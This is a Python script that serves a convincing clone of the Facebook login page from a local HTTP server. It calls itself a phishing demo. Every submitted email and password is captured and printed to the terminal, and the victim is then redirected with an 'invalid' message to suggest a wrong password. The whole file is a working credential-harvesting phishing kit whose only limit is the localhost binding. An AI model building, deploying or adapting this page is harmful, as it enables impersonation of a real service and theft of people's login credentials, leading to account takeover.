#!/usr/bin/env python3
"""
Facebook Clone Phishing Demo - Local Server
Captures login credentials and displays them in the terminal.
"""

import http.server
import socketserver
import urllib.parse
import sys

# ================= CONFIGURATION =================
HOST = "localhost"
PORT = 8080
BANNER = "☠️ END ☠️"
# =================================================

# HTML content for the Facebook clone login page
FACEBOOK_CLONE_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Facebook - Log in or sign up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        body {
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            width: 100%;
            max-width: 400px;
        }
        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
        }
        .logo {
            font-size: 56px;
            font-weight: bold;
            color: #1877f2;
            margin-bottom: 20px;
            font-family: inherit;
        }
        .form-group {
            margin-bottom: 12px;
        }
        input {
            width: 100%;
            padding: 14px 16px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
            background: white;
            outline: none;
            transition: border 0.1s ease;
        }
        input:focus {
            border-color: #1877f2;
            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
        }
        button {
            background: #1877f2;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: bold;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            margin-top: 8px;
            transition: background 0.2s;
        }
        button:hover {
            background: #166fe5;
        }
        .divider {
            margin: 20px 0;
            border-bottom: 1px solid #dadde1;
        }
        .signup-link {
            background: #42b72a;
            margin-top: 12px;
        }
        .signup-link:hover {
            background: #36a420;
        }
        .forgot {
            display: block;
            margin-top: 16px;
            font-size: 14px;
            color: #1877f2;
            text-decoration: none;
        }
        .forgot:hover {
            text-decoration: underline;
        }
        .note {
            font-size: 12px;
            color: #65676b;
            margin-top: 20px;
        }
        .error {
            background: #fdeded;
            color: #b94a48;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 12px;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="card">
        <div class="logo">facebook</div>
        <form method="POST" action="/login" onsubmit="return validateForm()">
            <div class="form-group">
                <input type="text" name="email" id="email" placeholder="Email address or phone number" autofocus required>
            </div>
            <div class="form-group">
                <input type="password" name="pass" id="pass" placeholder="Password" required>
            </div>
            <div class="form-group">
                <button type="submit">Log In</button>
            </div>
            <div id="errorMsg" class="error">Please fill in both fields.</div>
            <a href="#" class="forgot">Forgotten password?</a>
            <div class="divider"></div>
            <button type="button" class="signup-link" onclick="alert('This is a demo clone. No actual signup.')">Create New Account</button>
        </form>
        <div class="note">account login</div>
    </div>
</div>
<script>
    function validateForm() {
        var email = document.getElementById('email').value.trim();
        var pass = document.getElementById('pass').value.trim();
        if (email === '' || pass === '') {
            document.getElementById('errorMsg').style.display = 'block';
            return false;
        }
        document.getElementById('errorMsg').style.display = 'none';
        return true;
    }
</script>
</body>
</html>
"""

class RequestHandler(http.server.BaseHTTPRequestHandler):
    """Custom HTTP handler to serve the Facebook clone and capture POST credentials."""

    def do_GET(self):
        """Handle GET requests."""
        if self.path == '/' or self.path == '/index.html' or self.path == '/index.htm':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(FACEBOOK_CLONE_HTML.encode('utf-8'))
        elif self.path == '/favicon.ico':
            self.send_response(204)  # No content, ignore favicon
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def do_POST(self):
        """Handle POST requests — capture login credentials."""
        if self.path == '/login':
            # Read the content length to get POST data
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            # Parse URL-encoded form data
            parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))

            # Extract username/email and password (Facebook uses 'email' and 'pass')
            email = parsed_data.get('email', [''])[0]
            password = parsed_data.get('pass', [''])[0]

            # Display captured credentials in the terminal (Termux)
            print("\n" + "="*50)
            print("[!] CAPTURED LOGIN CREDENTIALS [!]")
            print(f"    Username/Email: {email}")
            print(f"    Password:       {password}")
            print("="*50 + "\n")
            sys.stdout.flush()  # Ensure immediate output in Termux

            # Send a simple response to the user (redirect back to login page with a message)
            self.send_response(302)  # Redirect
            self.send_header('Location', '/?msg=invalid')  # Optional: show a "wrong password" vibe
            self.end_headers()
        else:
            self.send_response(404)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'404 Not Found')

    def log_message(self, format, *args):
        """Override to suppress default HTTP request logging (optional, keeps terminal clean)."""
        # Uncomment next line if you want to see HTTP requests in terminal
        # super().log_message(format, *args)
        pass


def run_server():
    """Start the localhost HTTP server with the Facebook clone."""
    # Display the "ENS" banner as required
    print(f"\n{BANNER}\n")
    print(f"[*] Starting Facebook clone server on http://{HOST}:{PORT}/")
    print("[*] Press Ctrl+C to stop the server.\n")

    # Create and start the server
    with socketserver.TCPServer((HOST, PORT), RequestHandler) as httpd:
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\n[*] Server stopped by user.")
            sys.exit(0)


if __name__ == "__main__":
    run_server()
